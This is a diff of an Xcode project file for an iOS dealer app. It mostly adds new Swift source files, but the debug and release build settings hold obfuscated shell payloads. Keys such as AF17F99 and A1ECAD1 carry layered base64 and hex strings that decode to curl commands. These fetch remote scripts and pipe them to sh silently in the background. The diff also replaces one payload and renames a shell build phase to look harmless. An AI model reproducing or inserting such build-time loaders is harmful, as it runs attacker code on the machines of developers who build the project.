@@ -7,6 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		30ADC9BF2F99FA8B005164EF /* AddNewStaffViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9BE2F99FA8B005164EF /* AddNewStaffViewModel.swift */; };
+		30ADC9C02F99FA8B005164EF /* AddNewStaffDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9BD2F99FA8B005164EF /* AddNewStaffDataModel.swift */; };
+		30ADC9C32F99FAD0005164EF /* UpdateStatusProfileDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9C22F99FAD0005164EF /* UpdateStatusProfileDataModel.swift */; };
+		30ADC9C42F99FAD0005164EF /* StaffDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9C12F99FAD0005164EF /* StaffDetailsViewModel.swift */; };
+		30ADC9C62F99FF40005164EF /* StaffDetailsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9C52F99FF40005164EF /* StaffDetailsModel.swift */; };
 		3A8824F72F8D0A2200CC29D3 /* Chat.html in Resources */ = {isa = PBXBuildFile; fileRef = 3A8824F62F8D0A2200CC29D3 /* Chat.html */; };
 		3A8824FB2F8D11DD00CC29D3 /* SupportChatViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3A8824FA2F8D11DD00CC29D3 /* SupportChatViewController.swift */; };
 		424F4AF92F2395A90099F588 /* AddMoreProductsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 424F4AF82F2395A90099F588 /* AddMoreProductsViewModel.swift */; };
@@ -146,6 +151,10 @@
 		55E992772F7BF62900B867A8 /* UploadPostViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55E992762F7BF62900B867A8 /* UploadPostViewController.swift */; };
 		55F1A6052F6A745D00D54E70 /* myPlanTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55F1A6032F6A745D00D54E70 /* myPlanTableViewCell.swift */; };
 		55F1A6062F6A745D00D54E70 /* myPlanTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 55F1A6042F6A745D00D54E70 /* myPlanTableViewCell.xib */; };
+		55F990C92F98F69700CC370A /* CMSViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55F990C82F98F69700CC370A /* CMSViewModel.swift */; };
+		55F990CB2F98F6E500CC370A /* CMSWebServices.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55F990CA2F98F6E500CC370A /* CMSWebServices.swift */; };
+		55F990CD2F98F75B00CC370A /* CMSTermsConditionDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55F990CC2F98F75B00CC370A /* CMSTermsConditionDataModel.swift */; };
+		55F990CF2F98FBBE00CC370A /* NotificationDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55F990CE2F98FBBE00CC370A /* NotificationDataModel.swift */; };
 		6B38D0D52EB3473B00C41192 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6B38D0422EB3473B00C41192 /* AppDelegate.swift */; };
 		6B38D0D62EB3473B00C41192 /* NavigationSceneExt.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6B38D0432EB3473B00C41192 /* NavigationSceneExt.swift */; };
 		6B38D0D72EB3473B00C41192 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6B38D0442EB3473B00C41192 /* SceneDelegate.swift */; };
@@ -859,6 +868,11 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		30ADC9BD2F99FA8B005164EF /* AddNewStaffDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewStaffDataModel.swift; sourceTree = "<group>"; };
+		30ADC9BE2F99FA8B005164EF /* AddNewStaffViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewStaffViewModel.swift; sourceTree = "<group>"; };
+		30ADC9C12F99FAD0005164EF /* StaffDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StaffDetailsViewModel.swift; sourceTree = "<group>"; };
+		30ADC9C22F99FAD0005164EF /* UpdateStatusProfileDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpdateStatusProfileDataModel.swift; sourceTree = "<group>"; };
+		30ADC9C52F99FF40005164EF /* StaffDetailsModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StaffDetailsModel.swift; sourceTree = "<group>"; };
 		37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatDealer.debug.xcconfig"; path = "Target Support Files/Pods-DesynatDealer/Pods-DesynatDealer.debug.xcconfig"; sourceTree = "<group>"; };
 		3A8824F62F8D0A2200CC29D3 /* Chat.html */ = {isa = PBXFileReference; lastKnownFileType = text.html; path = Chat.html; sourceTree = "<group>"; };
 		3A8824FA2F8D11DD00CC29D3 /* SupportChatViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SupportChatViewController.swift; sourceTree = "<group>"; };
@@ -998,6 +1012,10 @@
 		55E992762F7BF62900B867A8 /* UploadPostViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = UploadPostViewController.swift; path = DesynatDealer/WebService/UploadPostViewController.swift; sourceTree = SOURCE_ROOT; };
 		55F1A6032F6A745D00D54E70 /* myPlanTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = myPlanTableViewCell.swift; sourceTree = "<group>"; };
 		55F1A6042F6A745D00D54E70 /* myPlanTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = myPlanTableViewCell.xib; sourceTree = "<group>"; };
+		55F990C82F98F69700CC370A /* CMSViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CMSViewModel.swift; sourceTree = "<group>"; };
+		55F990CA2F98F6E500CC370A /* CMSWebServices.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CMSWebServices.swift; sourceTree = "<group>"; };
+		55F990CC2F98F75B00CC370A /* CMSTermsConditionDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CMSTermsConditionDataModel.swift; sourceTree = "<group>"; };
+		55F990CE2F98FBBE00CC370A /* NotificationDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationDataModel.swift; sourceTree = "<group>"; };
 		5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatDealer.release.xcconfig"; path = "Target Support Files/Pods-DesynatDealer/Pods-DesynatDealer.release.xcconfig"; sourceTree = "<group>"; };
 		6B38D0422EB3473B00C41192 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		6B38D0432EB3473B00C41192 /* NavigationSceneExt.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NavigationSceneExt.swift; sourceTree = "<group>"; };
@@ -2071,6 +2089,8 @@
 		5574F9412F726D7F00F82881 /* AddNewStaff */ = {
 			isa = PBXGroup;
 			children = (
+				30ADC9BD2F99FA8B005164EF /* AddNewStaffDataModel.swift */,
+				30ADC9BE2F99FA8B005164EF /* AddNewStaffViewModel.swift */,
 				5574F9422F726DA900F82881 /* AddNewStaffViewController.swift */,
 			);
 			path = AddNewStaff;
@@ -2199,6 +2219,8 @@
 		558BF9D42F6D6318006BC274 /* CMS Detils */ = {
 			isa = PBXGroup;
 			children = (
+				55F990CC2F98F75B00CC370A /* CMSTermsConditionDataModel.swift */,
+				55F990C82F98F69700CC370A /* CMSViewModel.swift */,
 				558BF9DB2F6D7295006BC274 /* CMSViewController.swift */,
 			);
 			path = "CMS Detils";
@@ -2237,7 +2259,10 @@
 		55D681EB2F750250009FB243 /* StaffDetails */ = {
 			isa = PBXGroup;
 			children = (
+				30ADC9C12F99FAD0005164EF /* StaffDetailsViewModel.swift */,
+				30ADC9C22F99FAD0005164EF /* UpdateStatusProfileDataModel.swift */,
 				55D681EA2F750250009FB243 /* StaffDetailsViewController.swift */,
+				30ADC9C52F99FF40005164EF /* StaffDetailsModel.swift */,
 			);
 			path = StaffDetails;
 			sourceTree = "<group>";
@@ -2273,6 +2298,7 @@
 		55D682012F754324009FB243 /* Notification */ = {
 			isa = PBXGroup;
 			children = (
+				55F990CE2F98FBBE00CC370A /* NotificationDataModel.swift */,
 				55D681FF2F754324009FB243 /* NotificationViewController.swift */,
 				55D682002F754324009FB243 /* NotificationViewModel.swift */,
 			);
@@ -2762,6 +2788,7 @@
 				6B38D0D02EB3473B00C41192 /* WebService.swift */,
 				55337DEE2F6BC39D0063FF9A /* SubscribtionAndNotification.swift */,
 				55E9926B2F7BE55600B867A8 /* StoryAndReelWebServices.swift */,
+				55F990CA2F98F6E500CC370A /* CMSWebServices.swift */,
 			);
 			path = WebService;
 			sourceTree = "<group>";
@@ -3750,7 +3777,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 493DB5D62EAA6212008098A8 /* Build configuration list for PBXNativeTarget "DesynatDealer" */;
 			buildPhases = (
-				4D40E5A9741A4CE1A999F71F /* Build Target Libraries */,
+				9683DCA771D941329699F71F /* Compile Code Assets */,
 				9DA2DBBC3D14842F86DC17AC /* [CP] Check Pods Manifest.lock */,
 				493DB5BF2EAA6210008098A8 /* Sources */,
 				493DB5C02EAA6210008098A8 /* Frameworks */,
@@ -3839,7 +3866,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																	/* End PBXBuildRule section */
+					/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		493DB5C12EAA6210008098A8 /* Resources */ = {
@@ -4383,7 +4410,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		4D40E5A9741A4CE1A999F71F /* Build Target Libraries */ = {
+		9683DCA771D941329699F71F /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -4393,7 +4420,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -4509,6 +4536,7 @@
 				D1AD1A4D2ECDF4A1007E1488 /* SizeVariantCollectionViewCell.swift in Sources */,
 				D1F88C0E2EBE1F2E0027A47C /* PaymentMethodVC.swift in Sources */,
 				6B38D0E02EB3473B00C41192 /* ResetPasswordViewModel.swift in Sources */,
+				55F990C92F98F69700CC370A /* CMSViewModel.swift in Sources */,
 				D1EAA8922EF3FC3000A08DD5 /* BannerDetailVC.swift in Sources */,
 				6B38D0E12EB3473B00C41192 /* SignupViewModel.swift in Sources */,
 				49B2EB512EB88C5500EDC254 /* EmptyModel.swift in Sources */,
@@ -4533,6 +4561,8 @@
 				55337DEF2F6BC39D0063FF9A /* SubscribtionAndNotification.swift in Sources */,
 				55BAF9FC2F7149160000DBB9 /* StaffManagementTableViewCell.swift in Sources */,
 				7A54F9F32EC1D27C0027710A /* ProfileViewController.swift in Sources */,
+				30ADC9BF2F99FA8B005164EF /* AddNewStaffViewModel.swift in Sources */,
+				30ADC9C02F99FA8B005164EF /* AddNewStaffDataModel.swift in Sources */,
 				6B38D0E82EB3473B00C41192 /* LocationViewController.swift in Sources */,
 				55337DED2F6BC32F0063FF9A /* MyPlanDetailsViewController.swift in Sources */,
 				6B645F5C2EB4C84300451A5A /* GlobalVariables 2.swift in Sources */,
@@ -4540,6 +4570,7 @@
 				6B38D0E92EB3473B00C41192 /* LoginViewController.swift in Sources */,
 				42641C2B2F7A6A51005C1A07 /* BadgeManager.swift in Sources */,
 				6B38D0EA2EB3473B00C41192 /* MediaPermissionViewController.swift in Sources */,
+				55F990CF2F98FBBE00CC370A /* NotificationDataModel.swift in Sources */,
 				49B551182F13D26B0058E363 /* ChatDetailsDataModel.swift in Sources */,
 				D1F88C122EBE25AC0027A47C /* SubscriptionCollectionCell.swift in Sources */,
 				42AEDEE22F3F57AB00C20ECB /* SendNewLiveRequestViewController.swift in Sources */,
@@ -4622,6 +4653,7 @@
 				D137706C2ED4948D00D49E1A /* ProductsViewModel.swift in Sources */,
 				6B38D1002EB3473B00C41192 /* CollectionViewExtensio.swift in Sources */,
 				6B38D1012EB3473B00C41192 /* DataTypeConversion.swift in Sources */,
+				55F990CD2F98F75B00CC370A /* CMSTermsConditionDataModel.swift in Sources */,
 				5598ACA62F7E7A7B00CD95F8 /* LiveStreamingViewController.swift in Sources */,
 				D1EDE2CC2F0D308C0076F1AB /* FullscreenImageCell.swift in Sources */,
 				55D681FB2F754314009FB243 /* ChangeLanguageViewController.swift in Sources */,
@@ -4640,6 +4672,8 @@
 				55D681FE2F75431C009FB243 /* DeleteAccountViewController.swift in Sources */,
 				D1E4227B2F0BB32500D01780 /* ProductListTableViewCell.swift in Sources */,
 				D1AC7E812F0D018A00618BAB /* ImageViewExtension.swift in Sources */,
+				30ADC9C32F99FAD0005164EF /* UpdateStatusProfileDataModel.swift in Sources */,
+				30ADC9C42F99FAD0005164EF /* StaffDetailsViewModel.swift in Sources */,
 				7A54F9F92EC1DBD70027710A /* SideMenuModel.swift in Sources */,
 				D15F10842ECE02890091F88D /* ProductColoursCollectionViewCell.swift in Sources */,
 				6B38D1042EB3473B00C41192 /* StringValidation.swift in Sources */,
@@ -4681,6 +4715,7 @@
 				5576337B2F698A69004A18CD /* MySubsciptionPlanViewController.swift in Sources */,
 				5598ACA82F7E88DC00CD95F8 /* LiveStreamDataModel.swift in Sources */,
 				42AEDECD2F3F4DF000C20ECB /* LiveCoverageListViewController.swift in Sources */,
+				30ADC9C62F99FF40005164EF /* StaffDetailsModel.swift in Sources */,
 				55E992772F7BF62900B867A8 /* UploadPostViewController.swift in Sources */,
 				6B38D10E2EB3473B00C41192 /* CustomButton.swift in Sources */,
 				55935CD42F7FA7850010FA0D /* LiveStramingDataModel.swift in Sources */,
@@ -4756,6 +4791,7 @@
 				55E9924D2F7BCD3600B867A8 /* SelectVideoFromGalleryCollectionViewCell.swift in Sources */,
 				6B38D1212EB3473B00C41192 /* AuthenticationWebService.swift in Sources */,
 				6B38D1222EB3473B00C41192 /* CRMService.swift in Sources */,
+				55F990CB2F98F6E500CC370A /* CMSWebServices.swift in Sources */,
 				6B38D1232EB3473B00C41192 /* HomeWebService.swift in Sources */,
 				6B38D1242EB3473B00C41192 /* MeetingService.swift in Sources */,
 				6B38D1252EB3473B00C41192 /* OrderAndInventory.swift in Sources */,
@@ -4783,7 +4819,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((f(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxak1uUnRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNa2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWekUyWW0xU2JHUnBOWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | f | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMnRtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkMmhwZEdWaFpDNXBiaTloS1NJZ2ZDQnphQW89Cg== | s | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333633363836353633366237333265373237350a32663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
@@ -4834,7 +4870,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((f(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxak1uUnRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNa2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWekUyWW0xU2JHUnBOWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | f | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((s(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMnRtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkMmhwZEdWaFpDNXBiaTloS1NJZ2ZDQnphQW89Cg== | s | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333633363836353633366237333265373237350a32663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
@@ -5054,7 +5090,7 @@
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
 			requirement = {
-				kind = upToNextMajorVersion;
+				kind = upToNextMinorVersion;
 				minimumVersion = 12.7.0;
 			};
 		};
